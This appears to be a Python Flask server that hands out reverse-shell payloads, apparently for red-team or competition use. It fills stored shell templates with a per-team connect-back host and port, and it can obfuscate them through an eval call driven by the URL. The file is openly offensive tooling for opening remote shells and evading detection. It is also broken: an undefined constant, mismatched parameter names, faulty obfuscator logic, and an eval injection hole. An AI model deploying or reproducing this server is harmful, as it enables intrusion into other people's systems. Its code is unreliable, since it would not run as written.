import json, obfuscator
from flask import Flask, request, Response

app = Flask(__name__)

DEFAULT_LANG = 'bash'
DEFAULT_RAW = True
DEFAULT_OBFUSCATOR = 'default'

@app.route('/', methods=['GET'], defaults={
    'team_id': 'default',
    'language': DEFAULT_LANGUAGE,
    'obfuscator': None
})
@app.route('/<team_id>', methods=['GET'], defaults={
    'language': DEFAULT_LANGUAGE,
    'obfuscator': None
})
@app.route('/<team_id>/<language>', methods=['GET'], defaults={'obfuscator': None})
@app.route('/<team_id>/<language>/<obfuscator>', methods=['GET'])

def get_reverse_shell_code(team_id, lang, obfuscator):
    with open('payload.json', 'r') as f:
        payload = json.loads(f.read())

    with open('teams.json', 'r') as f:
        teams = json.loads(f.read())

    if not team_id in teams:
        team_id = 'default'
    host = teams[team_id]['host']
    port = teams[team_id]['port']

    if lang not in payload:
        lang = DEFAULT_LANG

    code = payload[lang]['raw'].format(HOST=host, PORT=port)
    if obfuscator in payload[lang][obfuscator]:
        code = eval('obfuscator.' + payload[lang][obfuscator])(code)

    return Response(code, mimetype='text/plain')

if __name__ == '__main__':
    # TODO: setup with argv
    app.run(host='0.0.0.0')
